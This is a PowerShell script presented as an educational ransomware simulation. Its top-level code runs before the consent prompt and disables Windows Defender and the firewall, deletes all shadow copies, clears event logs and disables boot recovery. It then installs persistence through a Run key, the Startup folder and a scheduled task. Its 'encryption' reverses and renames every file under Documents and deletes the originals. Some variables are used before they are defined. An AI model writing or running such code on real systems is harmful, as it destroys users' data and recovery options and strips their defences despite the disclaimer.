# Ransomware Simulation Script
# IMPORTANT: This script is for educational purposes only and should NEVER be used maliciously.

# Disclaimer function
function Show-Disclaimer {
    $disclaimer = @"
RANSOMWARE SIMULATION - LEGAL DISCLAIMER AND SAFETY NOTICE

This script simulates ransomware behavior for educational and testing purposes only.

By proceeding, you acknowledge and agree to the following:

1. Purpose: This simulation is strictly for cybersecurity education, research, and testing.
2. Environment: You will ONLY execute this simulation in a controlled, isolated virtual machine (VM) environment.
3. Prohibition: Running this simulation on any production system, network, or non-isolated environment is STRICTLY FORBIDDEN.
4. Responsibility: You assume full responsibility for any consequences resulting from the use of this script.
5. No Liability: The author(s) and distributor(s) of this script bear NO LIABILITY for any damage, data loss, or disruption caused by its use.
6. Legal Compliance: You will comply with all applicable local, state, and federal laws regarding cybersecurity testing and simulations.
7. Ethical Use: You will use this simulation ethically and responsibly, respecting the privacy and security of others.
8. No Malicious Intent: You will not use this script or any derived knowledge for malicious purposes or unauthorized activities.

Do you understand and agree to these terms? (Type 'I AGREE' to proceed): 
"@

    $confirmation = Read-Host -Prompt $disclaimer
    if ($confirmation -ne "I AGREE") {
        Write-Host "Simulation aborted. User did not agree to the terms."
        exit
    }
}

# Stop Windows Defender Real-Time Protection
Write-Host "Disabling Windows Defender..."
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name "WinDefend" -Force
Write-Host "Windows Defender Disabled."

# Delete Volume Shadow Copies to prevent recovery
Write-Host "Deleting Volume Shadow Copies..."
vssadmin delete shadows /all /quiet
Write-Host "Volume Shadow Copies deleted."

# Disable Windows Firewall
Write-Host "Disabling Windows Firewall..."
netsh advfirewall set allprofiles state off
Write-Host "Windows Firewall disabled."

# Clear Windows Event Logs to remove traces of the attack
Write-Host "Clearing Windows Event Logs..."
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
Write-Host "Windows Event Logs cleared."

# Disable System Restore points and recovery options
Write-Host "Disabling system restore and recovery options..."
bcdedit /set {default} recoveryenabled no
bcdedit /set {default} bootstatuspolicy ignoreallfailures
Write-Host "System restore and recovery options disabled."

# Function to generate a random string
function Get-RandomString($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
    return $randomString
}

# Simulate file encryption by reversing content
function Simulate-Encryption($filePath) {
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    [Array]::Reverse($fileContent)
    $encryptedFilePath = "$filePath.enc"
    [System.IO.File]::WriteAllBytes($encryptedFilePath, $fileContent)
    Remove-Item -Path $filePath -Force
    return $encryptedFilePath
}

# Function to create a ransom note
function Create-RansomNote($path) {
    $ransomNoteContent = @"
YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted and are no longer accessible. 
To regain access to your files, you must follow the instructions below.

What happened?
Your files have been encrypted using a simple content reversal algorithm. 
Attempting to reverse this operation without proper instructions will result in permanent data loss.

How to recover your files:
1. Contact recovery_service@ksjhdyernfbndehs.onion with the transaction ID.
2. Once we verify your request, we will send you the decryption tool and instructions.

REMEMBER: This is a simulation. In a real scenario, NEVER pay the ransom or contact criminals.
"@

    Set-Content -Path $path -Value $ransomNoteContent
    Write-Host "Ransom note created at: $path"
}

# Main execution
function Start-RansomwareSimulation {
    Show-Disclaimer

    $documentsPath = "$env:USERPROFILE\Documents"
    Write-Host "Simulating encryption of files in $documentsPath..."

    $files = Get-ChildItem -Path $documentsPath -Recurse -File -Force
    foreach ($file in $files) {
        try {
            $encryptedFilePath = Simulate-Encryption $file.FullName
            $randomName = Get-RandomString 8
            $newFilePath = [System.IO.Path]::Combine($file.DirectoryName, "$randomName.enc")
            Rename-Item -Path $encryptedFilePath -NewName $newFilePath
            Write-Host "Encrypted and renamed: $($file.FullName) -> $newFilePath"
        } catch {
            Write-Host "Failed to process: $($file.FullName) - Error: $_"
        }
    }

    Write-Host "Encryption simulation completed."

    $ransomNotePath = "$env:USERPROFILE\Desktop\SIMULATED_Ransom_Note.txt"
    Create-RansomNote $ransomNotePath

    Write-Host "Simulation finished. Files in $documentsPath have been encrypted with content reversal, renamed with random strings, and a simulated ransom note has been created on the Desktop."
}

# ---- Persistence Techniques ----

# 1. Registry Run Key (T1547.001)
Write-Host "Creating Registry Run Key for persistence..."
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regKeyName = "RansomwareSim"
$payloadPath = "$env:USERPROFILE\Desktop\RansomNote.bat"
Set-ItemProperty -Path $regPath -Name $regKeyName -Value $payloadPath
Write-Host "Registry Run Key created at $regPath with the payload $payloadPath."

# 2. Startup Folder (T1547.001)
Write-Host "Dropping payload in Startup folder for persistence..."
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item -Path $ransomNotePath -Destination "$startupFolder\RansomNote.bat"
Write-Host "Payload dropped in Startup folder."

# 3. Scheduled Task for Persistence (T1053)
Write-Host "Setting up Scheduled Task for persistence..."
$taskName = "RansomwareSimTask"
$triggerTime = New-ScheduledTaskTrigger -AtStartup
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $payloadPath"
Register-ScheduledTask -TaskName $taskName -Trigger $triggerTime -Action $taskAction -Description "Ransomware simulation persistence task"
Write-Host "Scheduled Task created to run at startup."

# Run the simulation
Start-RansomwareSimulation